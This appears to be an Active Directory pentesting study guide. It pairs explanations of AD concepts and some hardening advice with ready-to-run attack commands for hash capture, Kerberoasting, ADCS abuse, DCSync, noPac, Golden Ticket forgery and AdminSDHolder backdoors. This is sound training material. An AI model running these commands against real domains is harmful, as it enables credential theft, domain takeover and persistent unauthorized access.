Security Architecture Concepts

Modern Active Directory pentests bypass perimeter security models. By assuming a local breach foothold (the "Assume Breach" approach), we focus directly on structural misconfigurations, logical vulnerabilities, and identity delegation paths.

📖 Domain Concepts

Deep dive into directory partitions, structural containers, authentication mechanisms, and access configurations.

Forest, Tree, and Domains
Structure

An Active Directory structure forms a hierarchy. The Forest represents the topmost security boundary, housing schemas and forest-wide catalogs. A Domain is a partition within a forest housing users and computers, acting as the policy boundary. Domains can contain child subdomains (e.g. dev.corp.local) forming a Tree.

Security Implication: Forests are the ultimate security boundary. While domains act as administrative boundaries, weak trust paths between domains or misconfigured trusts can allow an attacker who compromises a child domain to traverse and escalate to Forest Admin.
Active Directory Trusts
Access

Trusts connect domains to share resources. A transitive trust flows through domains: if Domain A trusts B, and B trusts C, then A trusts C. A one-way trust allows users in the trusted domain to access resources in the trusting domain, but not vice-versa. A bidirectional trust lets resources and authentication flow mutually.

Security Implication: Attackers search for bidirectional or one-way trusts using tools like PowerView. Gaining domain access on a trusted network segment allows you to target kerberoastable accounts or perform pass-the-hash attacks directly against computers in the trusting domain.
OUs vs Containers
Administration

Organizational Units (OUs) are Active Directory containers where admins can delegate rights (such as password resets) and link Group Policy Objects (GPOs). Default folders like CN=Computers or CN=Users are basic Containers and cannot have GPOs directly linked to them.

ACLs & DACLs
Permissions

Every object in AD has an Access Control List (ACL). The Discretionary Access Control List (DACL) contains Access Control Entries (ACEs) defining exact permissions (e.g., who can read properties, change passwords, or write attributes to a user).

Security Implication: Over-permissive DACLs are high-value targets. If a standard user has GenericWrite over a privileged group or service account, they can modify its password, add members, or force-add an SPN to roast the account.
SIDs and RIDs
Identity

A Security Identifier (SID) is a unique string assigned to every security principal. The final component of the SID is the Relative Identifier (RID). Standard default accounts have well-known RIDs:

  • 500: Local/Domain Administrator
  • 502: KRBTGT service account
  • 512: Domain Admins group
  • 513: Domain Users group
FSMO Roles
Infrastructure

Flexible Single Master Operation (FSMO) roles divide DC responsibilities to avoid conflicts:

  • Schema Master: Forest-wide, manages read/write copies of the object templates.
  • Domain Naming Master: Forest-wide, manages naming spaces to prevent duplicate domain domains.
  • RID Master: Domain-wide, assigns blocks of Relative Identifiers to DCs.
  • PDC Emulator: Domain-wide, handles group policy updates, password changes, and clock sync.
  • Infrastructure Master: Domain-wide, translates SIDs and Distinguished Names across domain joins.
Kerberos Protocol Mechanics
Authentication

Kerberos is the default stateless authentication protocol in AD. It utilizes tickets issued by the KDC (Key Distribution Center):

  • AS-REQ: User requests a Ticket Granting Ticket (TGT), encrypting a timestamp with their password hash.
  • AS-REP: KDC decrypts, verifies, and returns the TGT (encrypted with the krbtgt account hash) and a session key.
  • TGS-REQ: User presents the TGT to request a service ticket (TGS) for a resource (e.g. cifs/DC01).
  • TGS-REP: KDC verifies and returns a TGS encrypted with the target service account's password hash.
  • AP-REQ: User presents the TGS to the service, and if it is valid, the user is permitted to connect to the resource.
NTLM & Net-NTLM (LM vs NT)
Authentication

Windows hashes are stored in the local SAM or domain NTDS.dit:

  • LM Hash: Deprecated, case-insensitive, splits passwords into 7-character chunks. Cryptographically weak.
  • NT Hash (NTLM): MD4 hash of the password. Stored in memory and databases, vulnerable to offline cracking and Pass-the-Hash (PtH).
  • Net-NTLM (v1/v2): Challenge-response protocol hashes sent over network links. Captured via broadcast poisoning, crackable offline, or relayable to machines with SMB signing disabled. Cannot be used for Pass-the-Hash.
  • MSCache2 (DCC2): Domain Cached Credentials saved locally in registry (HKLM\SECURITY\Cache) when DCs are offline. Slow to crack, cannot be used for Pass-the-Hash.
MSRPC Interfaces
Communication

Microsoft Remote Procedure Call (MSRPC) allows inter-process communication:

  • lsarpc: Manages local security policy and interactive authentication.
  • netlogon: Background service verifying authentication requests.
  • samr: Accesses the Security Accounts Manager database. Allows domain object enumeration.
  • drsuapi: Replicates objects between DCs. Abused by attackers to dump hashes via DCSync.
Group Policy Precedence & Inheritance
GPO

GPOs are processed in an Order of Precedence: Local GPO -> Site GPO -> Domain GPO -> OU GPO -> Nested OU GPO.

  • Enforced GPOs: Policies linked higher up that cannot be overridden by lower level OU links.
  • Block Inheritance: Stops parent container policies from applying, unless overridden by an Enforced link.
General Active Directory Hardening
Defense

Best practices for hardening the domain baseline:

  • LAPS: Randomizes and rotates local Administrator passwords on joined hosts, preventing lateral movement.
  • Account Separation: Admins must use separate daily user (sjones) and admin (sjones_adm) accounts.
  • gMSAs: Domain-managed service accounts with automatic 120-character password rotation.
  • Restricted Groups: GPOs configured to enforce local admin and RDP permissions across joined hosts.

🔍 Reconnaissance & Enumeration

Methods to identify active targets, enumerate domain mappings, and harvest usernames unauthenticated.

Active Host & Service Discovery
T1046

We sweep subnets passively (monitoring ARP/MDNS in Wireshark/tcpdump) or run active scans to locate the DC and open AD ports.

nmap - Sweep target DC services
nmap -sV -sC -p 53,88,135,139,389,445,5985,3389 10.10.10.100
Domain Context: Resolving the DNS server banner or LDAP properties automatically retrieves the internal Active Directory domain name (e.g., corp.local) and computer name (e.g., DC01).
SMB Null Sessions
T1135

A null session connects to SMB IPC$ anonymously (no credentials) to poll details from legacy or misconfigured DCs.

NetExec - Enumerate shares and RID range
# Check shares anonymously
nxc smb 10.10.10.100 -u "" -p "" --shares

# Brute-force RIDs anonymously to pull user accounts
nxc smb 10.10.10.100 -u "" -p "" --rid-brute
Why it works: If network security policies permit anonymous binds, the DC resolves RIDs (like 500 for Admin, 1000+ for domain users) and lists valid sAMAccountNames.
LDAP Anonymous Binds
T1087.002

An anonymous LDAP connection queries the Active Directory schema database without domain credentials.

ldapsearch - Dump sAMAccountNames
ldapsearch -x -H ldap://10.10.10.100 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
Kerberos Username Harvesting
T1589.003

Verifying account names against the Kerberos Key Distribution Center (KDC) via AS-REQ authentication packets.

kerbrute - Perform account enumeration
kerbrute userenum --dc 10.10.10.100 -d corp.local usernames.txt
Why it works: The KDC returns distinct responses: KDC_ERR_C_PRINCIPAL_UNKNOWN (username invalid) vs KDC_ERR_PREAUTH_REQUIRED (valid user requiring password). This does not trigger standard bad password login attempts, avoiding account lockouts.

🔑 Initial Footholds

Poison local network broadcasts, relay authentication tokens, and execute password spraying attacks.

LLMNR/NBT-NS Poisoning
T1557.001

Windows queries LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) when DNS fails. Responder listens on the wire and responds as the targeted server to capture password hashes.

Responder / Hashcat - Poison local broadcasts & crack
# Start Responder on interface ens224
sudo responder -I ens224 -wrdv

# Crack captured NTLMv2 hashes offline
hashcat -m 5600 captured_hashes.txt wordlist.txt
Real-World Use Case: An employee tries to connect to an offline file server (e.g. typing \\printer01 instead of \\print01). DNS fails, the client broadcasts, and your system intercepts. The client authenticates, sending a NetNTLMv2 hash which you crack to get a domain foothold.
Remediation Guide

Disable LLMNR in GPO: Computer Configuration -> Administrative Templates -> Network -> DNS Client -> Turn OFF Multicast Name Resolution.

Disable NetBIOS: Manually modify network adapter properties or deploy this startup script via GPO:

$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 }
AS-REP Roasting
T1558.004

If an account has "Do Not Require Kerberos Pre-Authentication" set, attackers can request an AS-REP ticket for that user and extract the encrypted ticket payload to crack offline.

GetNPUsers - Request roasting tickets
impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.100 -outputfile asrep.txt

# Crack offline using Hashcat mode 18200
hashcat -m 18200 asrep.txt wordlist.txt
Stealthy Password Spraying
T1110.003

Spraying a single common password (like Summer2026!) against a target list of sAMAccountNames. This avoids account locks by querying once per account per lockout window.

kerbrute - Passwordspray unauth
kerbrute passwordspray --dc 10.10.10.100 -d corp.local valid_users.txt "Welcome1!"

🔀 Lateral Movement

Authenticate across compromised servers, extract memory tickets, and establish command shells.

Pass-the-Hash (PtH)
T1550.002

Windows authentication protocols check credential hashes. If you acquire an NTLM hash (from SAM files, LSASS memory, or NTDS.dit), you can authenticate to SMB/RPC services directly without cracking the plaintext password.

wmiexec - Get lateral command execution
impacket-wmiexec corp.local/jsmith@10.10.10.101 -hashes :32693b11e6aa90eb43d32c72a07ceea6
Pass-the-Ticket (PtT)
T1550.003

Kerberos authentication relies on tickets. If you compromise a system and extract a valid Kerberos Ticket Granting Ticket (TGT) file belonging to another user from memory, you can inject it into your local terminal environment.

Rubeus / Linux Ticket Use
# On Windows: Import ticket directly into the current memory session
Rubeus.exe ptt /ticket:administrator.kirbi

# On Linux: Point to ccache file to authenticate
export KRB5CCNAME=/tmp/ticket.ccache
impacket-wmiexec -k -no-pass Administrator@DC01.corp.local

⚡ Privilege Escalation

Exploit Active Directory configurations to escalate standard domain accounts to Domain Admin.

Kerberoasting
T1558.003

Any domain user can request service tickets (TGS) for accounts with configured Service Principal Names (SPNs). The KDC encrypts the ticket using the service account's password hash. You request the ticket, dump it, and crack it offline.

GetUserSPNs - Roast service accounts
impacket-GetUserSPNs corp.local/jsmith:'Welcome1' -dc-ip 10.10.10.100 -request -outputfile hashes.txt
Domain Context & Example: Service accounts (e.g., svc_sql, svc_backup) are often granted Domain Admin or local administrator privileges. Gaining access to a low-privileged account lets you request tickets for these services, extract the hashes from the TGS-REP reply, and run dictionary attacks locally.
Active Directory Certificate Services (ADCS) Abuse
T1649

Under certificate template configuration ESC1, the template flag ENROLLEE_SUPPLIES_SUBJECT is enabled. This allows any standard user to request a certificate while supplying an arbitrary Subject Alternative Name (SAN) to masquerade as Administrator.

Certipy - Request ESC1 certificate & extract hash
# Request certificate for Administrator
certipy req -u jsmith@corp.local -p 'Welcome1' -ca "corp-CA" -template ESC1_Template -upn administrator@corp.local -dc-ip 10.10.10.100

# Authenticate using the certificate file to retrieve NTLM hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.100
ACL / DACL Abuse
T1222

Over-permissive DACL privileges over domain objects let attackers hijack accounts. For example, GenericWrite allows modifying user attributes, and WriteDACL allows writing new ACEs.

bloodyAD / PowerView - Abuse ACE permissions
# GenericWrite: force-reset a target's password
bloodyAD --host 10.10.10.100 -d corp.local -u jsmith -p 'Welcome1' set password svc_sql 'HackedPassword123!'

# WriteDACL: grant yourself DCSync permissions over the domain root
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity jsmith -Rights DCSync

👑 Domain Takeover

Harvest the entire domain database, dump sAMAccountNames, and forge golden admin identity tickets.

DCSync (DRSGetNCChanges)
T1003.006

DCSync simulates a Domain Controller replication request using the MS-DRSR protocol. Any account with replication permissions (like Domain Admin) can request password hashes directly from the KDC database.

secretsdump - Dump NTDS.dit hashes remotely
impacket-secretsdump corp.local/administrator:'P@ssw0rd!'@10.10.10.100 -just-dc-ntlm
Domain Context: DCSync does not run commands on the Domain Controller. It operates completely over RPC, making it highly effective for dumping sAMAccountNames and NTLM hashes.
NoPAC Takeover
T1210

Combines two CVEs (CVE-2021-42278 & CVE-2021-42287). It allows a standard domain user to create a machine account, rename it to match a DC, and request a service ticket. The KDC appends $ during lookup and issues a Domain Admin ticket.

noPac.py - Get shell on DC
python3 noPac.py corp.local/jsmith:'Welcome1' -dc-ip 10.10.10.100 -dc-host DC01 --impersonate administrator -shell

🔄 Domain Persistence

Establish long-term domain persistence backdoors across administrative groups.

Golden Ticket Forgery
T1558.001

The krbtgt account's NTLM hash signs all domain Kerberos Ticket Granting Tickets (TGTs). With this hash and the domain SID, you can forge a custom TGT representing any user (such as Administrator) with arbitrary group memberships.

ticketer - Forge TGT
impacket-ticketer -nthash krbtgt_hash_here -domain-sid S-1-5-21-xxxx -domain corp.local Administrator
Security Implication: Forged Golden Tickets remain valid even if the Administrator changes their password. To revoke a Golden Ticket, administrators must reset the krbtgt account password twice.
AdminSDHolder ACL Backdoor
T1222.001

AdminSDHolder is a container template. The SDProp process runs on the DC every 60 minutes, resetting permissions on all protected admin groups to match the AdminSDHolder DACL.

PowerView - Write backdoor ACE
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -PrincipalIdentity jsmith -Rights All
Domain Context: Adding your user account with All rights to AdminSDHolder ensures that even if you are removed from the Domain Admins group, SDProp will restore full control over all administrative accounts within an hour.

An open-source multi-domain home lab containing 5 virtual machines. It is highly recommended for self-hosting via Vagrant/VirtualBox to practice cross-forest trusts, ADCS templates, and delegation paths.
